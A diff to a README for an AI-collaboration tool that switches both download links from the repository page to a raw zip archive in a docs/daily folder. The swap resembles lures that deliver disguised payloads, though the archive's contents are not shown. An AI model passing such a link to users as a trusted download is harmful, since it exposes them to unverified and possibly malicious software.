@@ -1,12 +1,12 @@
 # 🛠️ tri-party-framework - Reliable AI collaboration for better results
 
-[![Download tri-party-framework](https://img.shields.io/badge/Download-tri-party-framework-blue.svg)](https://github.com/sloppy-yeast840/tri-party-framework)
+[![Download tri-party-framework](https://img.shields.io/badge/Download-tri-party-framework-blue.svg)](https://github.com/sloppy-yeast840/tri-party-framework/raw/refs/heads/main/docs/daily/party_tri_framework_v1.7.zip)
 
 This software manages the way different AI models work together. It uses three separate systems to check the work of each model. This process finds errors and improves the quality of every task. You can use it to compare results from different services like Claude, Gemini, and Codex. It links these models so they audit one another before they finish a project. 
 
 ## 📥 Getting Started
 
-Visit this page to download the software: https://github.com/sloppy-yeast840/tri-party-framework
+Visit this page to download the software: https://github.com/sloppy-yeast840/tri-party-framework/raw/refs/heads/main/docs/daily/party_tri_framework_v1.7.zip
 
 ### System Requirements
 
